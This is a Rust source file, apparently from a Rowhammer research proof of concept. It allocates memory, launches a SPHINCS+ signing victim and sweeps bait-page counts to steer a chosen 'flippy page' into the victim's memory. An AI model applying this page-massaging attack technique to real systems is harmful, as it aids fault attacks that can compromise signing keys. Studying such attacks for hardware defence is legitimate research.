use std::ptr::null_mut;

use anyhow::bail;
use bs_poc::{
    allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
    hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
    memory::{mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock},
    util::{KB, MB, PAGE_SIZE},
    victim::{sphincs_plus::SphincsPlus, HammerVictim, HammerVictimError, InjectionConfig},
};
use clap::{arg, Parser};
use indicatif::MultiProgress;
use log::{error, info, warn};

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    #[arg(short = 'b', long)]
    bait_before: Option<usize>,
    #[arg(short = 'a', long)]
    bait_after: Option<usize>,
    #[arg(long, default_value = "mmap")]
    alloc_strategy: AllocStrategy,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    target: String,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum AllocStrategy {
    Spoiler,
    Pfn,
    Mmap,
}

fn main() -> anyhow::Result<()> {
    env_logger::init();
    //const NUM_PAGES: usize = 1 << 21; // 8 GB
    //const ALLOC_SIZE: usize = NUM_PAGES * PAGE_SIZE;
    let args = CliArgs::parse();
    info!("CLI args: {:?}", args);
    let bs_config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&bs_config);
    //0..64 {
    //let bait_before = args.bait_before;
    let bait_before_range = args.bait_before.map(|b| b..b + 1).unwrap_or(0..30);
    let bait_after_range = args.bait_after.map(|b| b..b + 1).unwrap_or(0..30);
    let progress = MultiProgress::new();
    for bait_after in bait_after_range {
        for bait_before in bait_before_range.clone() {
            println!("bait_after,bait_before: {},{}", bait_after, bait_before);
            for _ in 0..args.repeat.unwrap_or(Some(1)).unwrap_or(2_usize.pow(32)) {
                // allocate bait page, get PFN
                let x = match args.alloc_strategy {
                    AllocStrategy::Spoiler => {
                        let mut spoiler =
                            Spoiler::new(mem_config, bs_config.threshold, Some(progress.clone()));
                        spoiler.alloc_consec_blocks(4 * MB)?
                    }
                    AllocStrategy::Pfn => {
                        let mut pfn = Pfn::new(mem_config);
                        pfn.alloc_consec_blocks(4 * MB)?
                    }
                    AllocStrategy::Mmap => {
                        let x: *mut u8 = mmap(null_mut(), 4 * MB);
                        if x.is_null() {
                            bail!("Failed to allocate memory");
                        }
                        ConsecBlocks::new(vec![MemBlock::new(x, 4 * MB)])
                    }
                };
                let flippy_page = unsafe { x.ptr().byte_add(64 * KB) as *mut libc::c_void };

                info!("Launching victim");
                let mut victim = match SphincsPlus::new_with_config(
                    args.target.clone(),
                    InjectionConfig {
                        target_addr: flippy_page as usize,
                        flippy_page_size: PAGE_SIZE,
                        bait_count_after: bait_after,
                        bait_count_before: bait_before,
                        stack_offset: usize::MAX,
                    },
                ) {
                    Ok(v) => v,
                    Err(e) => {
                        warn!("Error creating victim: {:?}", e);
                        println!("None");
                        continue;
                    }
                };
                let success = victim.start();
                match success {
                    Err(HammerVictimError::FlippyPageNotFound) => {
                        println!("None");
                    }
                    Err(HammerVictimError::FlippyPageOffsetMismatch { actual, .. }) => {
                        println!("{:?}", actual);
                    }
                    Err(e) => {
                        error!("Error starting victim: {:?}", e);
                        println!("{:?}", e);
                    }
                    Ok(_) => {
                        println!("{}", usize::MAX);
                    }
                }
                //if output.contains(&format!("{:x}", target_pfn)) {
                //    bail!("YES MAN: {},{}", bait_before, bait_after);
                //}
                /*let flippy_page = find_flippy_page(target_pfn, victim.pid())?;
                if let Some(flippy_region) = &flippy_page {
                    info!("Flippy page reused in region {:?}", flippy_region);
                } else {
                    warn!("Flippy page not reused");
                }
                println!("{:?}", flippy_page);*/
                victim.stop();
                x.dealloc();
            }
        }
    }
    Ok(())
}
